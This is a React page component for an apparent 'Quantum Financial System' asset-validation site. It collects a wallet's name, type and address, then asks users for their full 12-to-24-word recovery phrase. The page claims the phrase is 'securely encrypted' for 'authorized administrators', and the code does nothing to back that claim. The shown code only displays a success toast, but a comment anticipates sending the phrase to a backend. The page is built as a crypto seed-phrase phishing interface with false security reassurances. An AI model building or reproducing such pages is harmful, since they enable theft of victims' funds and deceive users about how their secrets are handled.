
import React, { useState } from "react";
import { AlertCircle, ArrowLeft, KeyRound, Shield, Wallet } from "lucide-react";
import { toast } from "sonner";
import AnimatedSection from "@/components/ui/AnimatedSection";
import ButtonEffect from "@/components/ui/ButtonEffect";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";
import { Link } from "react-router-dom";

const Validate = () => {
  const [step, setStep] = useState(1);
  const [walletName, setWalletName] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [walletType, setWalletType] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (step === 1) {
      setStep(2);
      return;
    }
    
    // In a real application, you would send this data securely to your backend
    // For demonstration purposes, we're just showing a toast notification
    if (seedPhrase.trim().split(/\s+/).length >= 12) {
      toast.success("Validation submitted successfully", {
        description: "An administrator will validate your assets soon."
      });
      
      // Reset form and go back to step 1
      setWalletName("");
      setWalletAddress("");
      setWalletType("");
      setSeedPhrase("");
      setStep(1);
    } else {
      toast.error("Invalid seed phrase", {
        description: "Please enter a valid 12, 18, or 24-word recovery phrase."
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-28 pb-20 bg-gradient-to-b from-custodia-surface/30 to-white">
        <div className="container-custom max-w-2xl">
          <AnimatedSection>
            <div className="mb-8">
              <div className="flex items-center mb-4">
                {step === 2 && (
                  <button 
                    onClick={() => setStep(1)} 
                    className="mr-2 text-gray-600 hover:text-custodia transition-colors"
                  >
                    <ArrowLeft className="h-5 w-5" />
                  </button>
                )}
                <h1 className="text-3xl font-bold">Validate Your Assets</h1>
              </div>
              <p className="text-gray-600">
                Securely validate your digital assets for integration with the Quantum Financial System
              </p>
            </div>
          </AnimatedSection>
          
          <AnimatedSection delay={2}>
            <div className="glass p-8 rounded-2xl">
              {step === 1 ? (
                <>
                  <div className="flex items-center gap-3 mb-6 text-custodia">
                    <Wallet className="h-5 w-5" />
                    <span className="font-medium">Wallet Information</span>
                  </div>
                  
                  <form onSubmit={handleSubmit} className="space-y-6">
                    <div className="space-y-2">
                      <label htmlFor="walletName" className="block text-sm font-medium">
                        Wallet Name
                      </label>
                      <input
                        id="walletName"
                        type="text"
                        className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50"
                        placeholder="Enter a name for this wallet"
                        value={walletName}
                        onChange={(e) => setWalletName(e.target.value)}
                        required
                      />
                    </div>
                    
                    <div className="space-y-2">
                      <label htmlFor="walletType" className="block text-sm font-medium">
                        Wallet Type
                      </label>
                      <select
                        id="walletType"
                        className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50"
                        value={walletType}
                        onChange={(e) => setWalletType(e.target.value)}
                        required
                      >
                        <option value="">Select wallet type</option>
                        <option value="bitcoin">Bitcoin</option>
                        <option value="ethereum">Ethereum</option>
                        <option value="tron">Tron</option>
                        <option value="ripple">Ripple (XRP)</option>
                        <option value="binance">Binance</option>
                        <option value="metamask">MetaMask</option>
                        <option value="trustwallet">Trust Wallet</option>
                        <option value="ledger">Ledger</option>
                        <option value="trezor">Trezor</option>
                        <option value="other">Other</option>
                      </select>
                    </div>
                    
                    <div className="space-y-2">
                      <label htmlFor="walletAddress" className="block text-sm font-medium">
                        Wallet Address
                      </label>
                      <input
                        id="walletAddress"
                        type="text"
                        className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50"
                        placeholder="Enter your wallet address"
                        value={walletAddress}
                        onChange={(e) => setWalletAddress(e.target.value)}
                        required
                      />
                    </div>
                    
                    <div className="pt-4">
                      <ButtonEffect variant="primary" className="w-full">
                        Continue to Seed Validation
                      </ButtonEffect>
                    </div>
                  </form>
                </>
              ) : (
                <>
                  <div className="flex items-center gap-3 mb-6 text-custodia">
                    <Shield className="h-5 w-5" />
                    <span className="font-medium">Secure Validation Process</span>
                  </div>
                  
                  <form onSubmit={handleSubmit} className="space-y-6">
                    <div className="space-y-2">
                      <label htmlFor="seed" className="block text-sm font-medium">
                        Recovery Phrase
                      </label>
                      <textarea
                        id="seed"
                        className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50 min-h-[120px]"
                        placeholder="Enter your 12, 18, or 24-word recovery phrase separated by spaces"
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        required
                      />
                      <div className="flex items-start gap-2 text-sm text-gray-600">
                        <AlertCircle className="h-4 w-4 mt-0.5 shrink-0" />
                        <p>Your recovery phrase is securely encrypted and only accessible by authorized administrators for validation purposes.</p>
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-2">
                      <KeyRound className="h-5 w-5 text-custodia" />
                      <p className="text-sm font-medium text-custodia">End-to-end encrypted connection</p>
                    </div>
                    
                    <div className="pt-4">
                      <ButtonEffect variant="primary" className="w-full">
                        Submit for Validation
                      </ButtonEffect>
                    </div>
                  </form>
                </>
              )}
            </div>
          </AnimatedSection>

          <AnimatedSection delay={3}>
            <div className="mt-8 text-center">
              <p className="text-sm text-gray-600">
                Need help? <Link to="/contact" className="text-custodia hover:underline">Contact our support team</Link>
              </p>
            </div>
          </AnimatedSection>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Validate;
